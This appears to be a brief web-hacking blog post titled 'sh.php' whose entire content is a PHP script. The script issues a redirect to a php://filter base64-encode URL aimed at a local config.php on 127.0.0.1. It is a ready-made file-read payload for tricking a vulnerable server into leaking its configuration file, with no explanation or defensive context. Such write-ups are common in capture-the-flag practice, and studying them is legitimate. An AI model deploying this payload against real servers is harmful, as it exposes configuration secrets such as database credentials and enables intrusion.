---
layout: post
title:  "sh.php"
date:   2020-09-25
categories: ["2020","web hacking"]
---
<?php
    header( 'Location: php://filter/convert.base64-encode/resource=http://127.0.0.1/config.php' );
?>